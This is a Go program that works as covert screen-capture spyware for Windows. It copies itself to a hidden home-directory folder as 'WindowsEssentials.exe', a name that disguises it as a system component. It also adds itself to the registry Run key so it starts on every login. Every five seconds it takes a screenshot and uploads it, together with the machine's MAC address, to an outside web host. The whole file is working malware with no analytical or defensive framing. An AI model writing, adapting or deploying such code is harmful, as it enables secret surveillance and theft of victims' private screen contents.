package main

import (
	"bytes"
	"fmt"
	"image/jpeg"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
)

func screenCapture() string {
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)

	if err != nil {
		fmt.Println("Error", err)
		return "error"
	}

	currentTime := time.Now()
	formattedTime := currentTime.Format("2006_01_02_15_04_05")

	fileName := formattedTime + ".jpg"
	file, err := os.Create(fileName)

	if err != nil {
		fmt.Println("Error", err)
		return "error"

	}

	defer file.Close()
	jpegQuality := 60

	err = jpeg.Encode(file, img, &jpeg.Options{Quality: jpegQuality})

	if err != nil {
		fmt.Println("Error", err)
		return "error"

	}
	fmt.Println("ScreenShot Saved")
	return fileName

}

func copySelf(destination string) error {
	destination = destination + "\\WindowsEssentials.exe"

	_, err := os.Stat(destination)

	if err == nil {
		fmt.Println("File already exists", err)
		return err
	}

	if !os.IsNotExist(err) {
		fmt.Println("error checking file", err)
		return err
	}

	execPath, err := os.Executable()
	if err != nil {
		fmt.Println("Error", err)
		return err
	}

	srcFile, err := os.Open(execPath)
	if err != nil {
		fmt.Println("Error", err)
		return err
	}

	defer srcFile.Close()

	destDir := filepath.Dir(destination)
	err = os.MkdirAll(destDir, 0755)
	if err != nil {
		fmt.Println("Error", err)
		return err
	}

	destFile, err := os.Create(destination)
	if err != nil {
		fmt.Println("Error", err)
		return err
	}

	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		fmt.Println("Error", err)
		return err
	}

	fmt.Println("File copied")

	return err
}

func addToStartup(destination string) {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		fmt.Println("Error", err)
		return
	}
	defer key.Close()

	err = key.SetStringValue("WindowsEssentials", destination+"\\WindowsEssentials.exe")
	if err != nil {
		fmt.Println("Error", err)
		return
	}
	fmt.Println("added to startup")
}

func uploadData(screenshotFile string, mac string) {
	url := "https://sservicee.000webhostapp.com/file.php" //url to your server
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	file, err := os.Open(screenshotFile)
	if err != nil {
		fmt.Println("Error", err)
		return
	}

	defer file.Close()

	part, err := writer.CreateFormFile("screenshot", screenshotFile)
	if err != nil {
		fmt.Println("Error", err)
		return
	}

	_, err = io.Copy(part, file)
	if err != nil {
		fmt.Println("Error", err)
		return
	}

	_ = writer.WriteField("mac_addr", mac)

	writer.Close()

	resp, err := http.Post(url, writer.FormDataContentType(), &requestBody)
	if err != nil {
		fmt.Println("Error", err)
		return
	}

	defer resp.Body.Close()

	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error", err)
		return
	}

	fmt.Println("response", string(responseBody))

}

func getMACAddress() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		fmt.Println("Error", err)
		return "", err
	}

	for _, interf := range interfaces {
		if len(interf.HardwareAddr) > 0 {
			return interf.HardwareAddr.String(), nil
		}
	}

	return "", fmt.Errorf("No MAC address found")

}

func main() {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("Error", err)
		return
	}

	fmt.Println(homeDir)

	destination := filepath.Join(homeDir, ".windows_essentials")
	fmt.Println(destination)

	err = copySelf(destination)

	addToStartup(destination)

	mac_addr, err := getMACAddress()

	fmt.Println(mac_addr)

	for true {
		fileName := screenCapture()
		uploadData(fileName, mac_addr)
		time.Sleep(5 * time.Second)
	}

}
